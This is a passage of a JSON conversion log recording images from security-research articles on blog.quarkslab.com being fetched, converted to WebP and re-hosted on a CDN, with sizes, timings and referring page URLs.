09:15:13","host":"us-013*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"84.4 KB","destSize":"40.3 KB","compressRate":"47.7%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES10.png","sourceStatusCode":200,"destWidth":6364,"destHeight":1476,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn78@2020_6/2020/08/25/01-15-13-613_ece9a2f5de9f6d0f.webp","sourceBytes":401553,"destBytes":345096,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":3097,"convertSpendMs":840,"createdTime":"2020-08-25 09:15:12","host":"europe69*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"392.1 KB","destSize":"337 KB","compressRate":"85.9%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/back.jpg","sourceStatusCode":200,"destWidth":4032,"destHeight":3024,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn96@2020_1/2020/08/25/01-15-14-011_7f7e51da9810b8c1.webp","sourceBytes":3935559,"destBytes":679262,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":3255,"convertSpendMs":689,"createdTime":"2020-08-25 09:15:12","host":"us-010*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.8 MB","destSize":"663.3 KB","compressRate":"17.3%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/chips.jpg","sourceStatusCode":200,"destWidth":4032,"destHeight":3024,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn8@2020_3/2020/08/25/01-15-13-369_aa5c707792c4e840.webp","sourceBytes":3794001,"destBytes":496614,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":3162,"convertSpendMs":560,"createdTime":"2020-08-25 09:15:12","host":"europe69*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.6 MB","destSize":"485 KB","compressRate":"13.1%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES_zz.png","sourceStatusCode":200,"destWidth":6364,"destHeight":1480,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn40@2020_2/2020/08/25/01-15-14-110_2088f734e9717d05.webp","sourceBytes":346110,"destBytes":360286,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":3292,"convertSpendMs":811,"createdTime":"2020-08-25 09:15:12","host":"us-006*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"338 KB","destSize":"351.8 KB","compressRate":"104.1%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-01-16_reversing-trimedia-part-3/operations.png","sourceStatusCode":200,"destWidth":451,"destHeight":401,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn68@2020_5/2020/08/25/01-15-14-613_7a4fcb951be144e4.webp","sourceBytes":20828,"destBytes":13692,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1715,"convertSpendMs":12,"createdTime":"2020-08-25 09:15:13","host":"us-55*","referer":"http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html","linkMd5ListStr":"83ba6cdf4912af08e5b4a404183a7181","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"20.3 KB","destSize":"13.4 KB","compressRate":"65.7%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-11-26_legu_packer/hashmap.png","sourceStatusCode":200,"destWidth":1486,"destHeight":412,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn80@2020_1/2020/08/25/01-15-14-747_cbc1aea05726f8fe.webp","sourceBytes":282558,"destBytes":26592,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1699,"convertSpendMs":46,"createdTime":"2020-08-25 09:15:13","host":"us-017*","referer":"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html","linkMd5ListStr":"41cd2e745dd1c20533633d789273ed24","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"275.9 KB","destSize":"26 KB","compressRate":"9.4%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/too_many_keys.jpg","sourceStatusCode":200,"destWidth":576,"destHeight":433,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn72@2020_5/2020/08/25/01-15-14-738_7e00042d784d61db.webp","sourceBytes":62475,"destBytes":21890,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1757,"convertSpendMs":25,"createdTime":"2020-08-25 09:15:13","host":"us-037*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"61 KB","destSize":"21.4 KB","compressRate":"35%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-28_ansible/execution_plugin_normal.png","sourceStatusCode":200,"destWidth":2324,"destHeight":2244,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn39@2020_1/2020/08/25/01-15-14-523_d6215c14bfa11c5a.webp","sourceBytes":290928,"destBytes":170154,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2139,"convertSpendMs":226,"createdTime":"2020-08-25 09:15:13","host":"us-006*","referer":"http://blog.quarkslab.com/ansible-security-assessment.html","linkMd5ListStr":"c919f76de397f905c0933c5249b3e20c","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"284.1 KB","destSize":"166.2 KB","compressRate":"58.5%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ow2.PNG","sourceStatusCode":200,"destWidth":666,"destHeight":273,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn63@2020_4/2020/08/25/01-15-14-273_1dd9bedc1c65d95b.webp","sourceBytes":24756,"destBytes":13044,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1652,"convertSpendMs":10,"createdTime":"2020-08-25 09:15:13","host":"europe63*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.2 KB","destSize":"12.7 KB","compressRate":"52.7%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-03-23_mediatek-cve-2020-0069/move_command.png","sourceStatusCode":200,"destWidth":851,"destHeight":494,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn88@2020_1/2020/08/25/01-15-14-383_23dc65e86cfe1f06.webp","sourceBytes":39197,"destBytes":54798,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1645,"convertSpendMs":45,"createdTime":"2020-08-25 09:15:14","host":"europe-25*","referer":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html","linkMd5ListStr":"b5e122d24638afa80a92a8b4e06af637","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"38.3 KB","destSize":"53.5 KB","compressRate":"139.8%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/uart.jpg","sourceStatusCode":200,"destWidth":3024,"destHeight":4032,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn47@2020_3/2020/08/25/01-15-13-300_c5bbef72b0ad02c9.webp","sourceBytes":3241310,"destBytes":633018,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":3510,"convertSpendMs":551,"createdTime":"2020-08-25 09:15:12","host":"europe-57*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.1 MB","destSize":"618.2 KB","compressRate":"19.5%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/fs_first_magic.PNG","sourceStatusCode":200,"destWidth":925,"destHeight":764,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn59@2020_2/2020/08/25/01-15-14-266_37812c90ad5d71e5.webp","sourceBytes":243010,"destBytes":143642,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1938,"convertSpendMs":46,"createdTime":"2020-08-25 09:15:13","host":"europe21*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"237.3 KB","destSize":"140.3 KB","compressRate":"59.1%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/files_xrefs.PNG","sourceStatusCode":200,"destWidth":1350,"destHeight":675,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn91@2020_1/2020/08/25/01-15-14-418_a6ac20877bff3794.webp","sourceBytes":90550,"destBytes":99690,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1772,"convertSpendMs":43,"createdTime":"2020-08-25 09:15:14","host":"europe67*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"88.4 KB","destSize":"97.4 KB","compressRate":"110.1%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_second_try.PNG","sourceStatusCode":200,"destWidth":525,"destHeight":700,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn15@2020_1/2020/08/25/01-15-15-048_d5b77921dc7cfb92.webp","sourceBytes":22710,"destBytes":28518,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1683,"convertSpendMs":21,"createdTime":"2020-08-25 09:15:14","host":"us-004*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"22.2 KB","destSize":"27.8 KB","compressRate":"125.6%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/exception_levels_aarch64.png","sourceStatusCode":200,"destWidth":1606,"destHeight":986,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn95@2020_6/2020/08/25/01-15-14-577_5f903c02c9bf6c07.webp","sourceBytes":210301,"destBytes":128568,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1855,"convertSpendMs":138,"createdTime":"2020-08-25 09:15:14","host":"europe-59*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"205.4 KB","destSize":"125.6 KB","compressRate":"61.1%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-11-26_legu_packer/unpacked.png","sourceStatusCode":200,"destWidth":900,"destHeight":1018,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn100@2020_1/2020/08/25/01-15-15-123_6ad1ba4fe7d9d549.webp","sourceBytes":177150,"destBytes":46876,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1996,"convertSpendMs":101,"createdTime":"2020-08-25 09:15:14","host":"us-51*","referer":"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html","linkMd5ListStr":"41cd2e745dd1c20533633d789273ed24","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"173 KB","destSize":"45.8 KB","compressRate":"26.5%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_window.PNG","sourceStatusCode":200,"destWidth":524,"destHeight":700,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn46@2020_2/2020/08/25/01-15-15-076_2e0a53c700e8bfdf.webp","sourceBytes":22346,"destBytes":26852,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1390,"convertSpendMs":20,"createdTime":"2020-08-25 09:15:14","host":"europe66*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"21.8 KB","destSize":"26.2 KB","compressRate":"120.2%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/tz_archi_intermediate.png","sourceStatusCode":200,"destWidth":711,"destHeight":492,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn27@2020_4/2020/08/25/01-15-15-208_54cabc3812d124ef.webp","sourceBytes":115649,"destBytes":41712,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1747,"convertSpendMs":19,"createdTime":"2020-08-25 09:15:14","host":"us-55*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"112.9 KB","destSize":"40.7 KB","compressRate":"36.1%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-10-samsung_trustzone_exploitation_part2/script_after.png","sourceStatusCode":200,"destWidth":748,"destHeight":484,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn40@2020_3/2020/08/25/01-15-15-164_249a44b43d381413.webp","sourceBytes":35966,"destBytes":55958,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1638,"convertSpendMs":19,"createdTime":"2020-08-25 09:15:14","host":"us-017*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-2.html","linkMd5ListStr":"67866c8423e15119961fa91dec078a96","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"35.1 KB","destSize":"54.6 KB","compressRate":"155.6%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/panic.png","sourceStatusCode":200,"destWidth":1043,"destHeight":823,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn36@2020_3/2020/08/25/01-15-15-142_c94d01d6fdc0f41e.webp","sourceBytes":38932,"destBytes":98976,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1724,"convertSpendMs":73,"createdTime":"2020-08-25 09:15:14","host":"us-027*","referer":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html","linkMd5ListStr":"49a8fa1929e7094fabb72d5aefec1af8","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"38 KB","destSize":"96.7 KB","compressRate":"254.2%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-28_ansible/execution_plugin_normal_become_vuln.png","sourceStatusCode":200,"destWidth":3188,"destHeight":2244,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn7@2020_3/2020/08/25/01-15-15-226_ff215bdaf98258d2.webp","sourceBytes":372776,"destBytes":245938,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2285,"convertSpendMs":245,"createdTime":"2020-08-25 09:15:14","host":"us-022*","referer":"http://blog.quarkslab.com/ansible-security-assessment.html","linkMd5ListStr":"c919f76de397f905c0933c5249b3e20c","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"364 KB","destSize":"240.2 KB","compressRate":"66%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-28_ansible/playbook_multiple_user_vuln_p2.png","sourceStatusCode":200,"destWidth":2324,"destHeight":2244,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn75@2020_3/2020/08/25/01-15-15-339_cae619074725dc40.webp","sourceBytes":191832,"destBytes":122386,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2513,"convertSpendMs":539,"createdTime":"2020-08-25 09:15:13","host":"us-027*","referer":"http://blog.quarkslab.com/ansible-security-assessment.html","linkMd5ListStr":"c919f76de397f905c0933c5249b3e20c","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"187.3 KB","destSize":"119.5 KB","compressRate":"63.8%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/monitor_comm_nwd.png","sourceStatusCode":200,"destWidth":1385,"destHeight":781,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn84@2020_4/2020/08/25/01-15-15-226_f3385748d04bad41.webp","sourceBytes":161272,"destBytes":101426,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2454,"convertSpendMs":283,"createdTime":"2020-08-25 09:15:13","host":"us-008*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"157.5 KB","destSize":"99 KB","compressRate":"62.9%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/ta_life_cycle.png","sourceStatusCode":200,"destWidth":1367,"destHeight":1317,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn87@2020_2/2020/08/25/01-15-15-589_d9c5123e607fd10d.webp","sourceBytes":148782,"destBytes":72978,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":4454,"convertSpendMs":2141,"createdTime":"2020-08-25 09:15:12","host":"us-035*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"145.3 KB","destSize":"71.3 KB","compressRate":"49.1%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-12-jcop-pinlength-timing-attack/capture.png","sourceStatusCode":200,"destWidth":2342,"destHeight":796,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn16@2020_5/2020/08/25/01-15-15-708_799c011110a32d17.webp","sourceBytes":173321,"destBytes":53286,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":4465,"convertSpendMs":2259,"createdTime":"2020-08-25 09:15:12","host":"us-035*","referer":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html","linkMd5ListStr":"45d86b363b28f0fc661f9ac9a1472981","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"169.3 KB","destSize":"52 KB","compressRate":"30.7%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES_new.png","sourceStatusCode":200,"destWidth":2568,"destHeight":1152,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn11@2020_6/2020/08/25/01-15-15-520_37b5ead4689100bc.webp","sourceBytes":244389,"destBytes":172804,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2541,"convertSpendMs":549,"createdTime":"2020-08-25 09:15:14","host":"us-013*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"238.7 KB","destSize":"168.8 KB","compressRate":"70.7%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-01-16_reversing-trimedia-part-3/format_bits.png","sourceStatusCode":200,"destWidth":711,"destHeight":371,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn70@2020_3/2020/08/25/01-15-15-607_1484525c035c59f3.webp","sourceBytes":28355,"destBytes":25362,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1317,"convertSpendMs":21,"createdTime":"2020-08-25 09:15:15","host":"europe66*","referer":"http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html","linkMd5ListStr":"83ba6cdf4912af08e5b4a404183a7181","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"27.7 KB","destSize":"24.8 KB","compressRate":"89.4%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/components.png","sourceStatusCode":200,"destWidth":562,"destHeight":281,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn77@2020_1/2020/08/25/01-15-15-986_88a95b66a6d49625.webp","sourceBytes":31590,"destBytes":19306,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1439,"convertSpendMs":13,"createdTime":"2020-08-25 09:15:15","host":"us-53*","referer":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html","linkMd5ListStr":"49a8fa1929e7094fabb72d5aefec1af8","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"30.8 KB","destSize":"18.9 KB","compressRate":"61.1%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/putty-config.PNG","sourceStatusCode":200,"destWidth":677,"destHeight":676,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn61@2020_5/2020/08/25/01-15-16-073_85f4cd0751afeede.webp","sourceBytes":26370,"destBytes":32036,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1667,"convertSpendMs":31,"createdTime":"2020-08-25 09:15:15","host":"us-003*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"25.8 KB","destSize":"31.3 KB","compressRate":"121.5%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-12-jcop-pinlength-timing-attack/instrumented_reader2_1024.jpg","sourceStatusCode":200,"destWidth":1024,"destHeight":432,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn73@2020_3/2020/08/25/01-15-15-710_3b7e18561792854c.webp","sourceBytes":182617,"destBytes":68212,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1543,"convertSpendMs":55,"createdTime":"2020-08-25 09:15:15","host":"europe-59*","referer":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html","linkMd5ListStr":"45d86b363b28f0fc661f9ac9a1472981","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"178.3 KB","destSize":"66.6 KB","compressRate":"37.4%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-12-jcop-pinlength-timing-attack/instrumented_reader_1024.jpg","sourceStatusCode":200,"destWidth":1024,"destHeight":1024,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn50@2020_5/2020/08/25/01-15-16-102_0ccd0b847fa016cb.webp","sourceBytes":324013,"destBytes":93698,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2152,"convertSpendMs":143,"createdTime":"2020-08-25 09:15:14","host":"us-024*","referer":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html","linkMd5ListStr":"45d86b363b28f0fc661f9ac9a1472981","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"316.4 KB","destSize":"91.5 KB","compressRate":"28.9%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES5.png","sourceStatusCode":200,"destWidth":6364,"destHeight":1256,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn20@2020_3/2020/08/25/01-15-15-442_430f83c02d2e3efc.webp","sourceBytes":366231,"destBytes":307414,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2774,"convertSpendMs":816,"createdTime":"2020-08-25 09:15:14","host":"europe21*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"357.6 KB","destSize":"300.2 KB","compressRate":"83.9%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/img_hdr.png","sourceStatusCode":200,"destWidth":782,"destHeight":763,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn65@2020_1/2020/08/25/01-15-15-808_5303b2c769d30d67.webp","sourceBytes":180264,"destBytes":91128,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1871,"convertSpendMs":32,"createdTime":"2020-08-25 09:15:15","host":"europe-22*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"176 KB","destSize":"89 KB","compressRate":"50.6%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/fs_second_magic.PNG","sourceStatusCode":200,"destWidth":925,"destHeight":764,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn82@2020_3/2020/08/25/01-15-16-337_05240c71cb2757dc.webp","sourceBytes":266624,"destBytes":143896,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1935,"convertSpendMs":45,"createdTime":"2020-08-25 09:15:15","host":"us-037*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"260.4 KB","destSize":"140.5 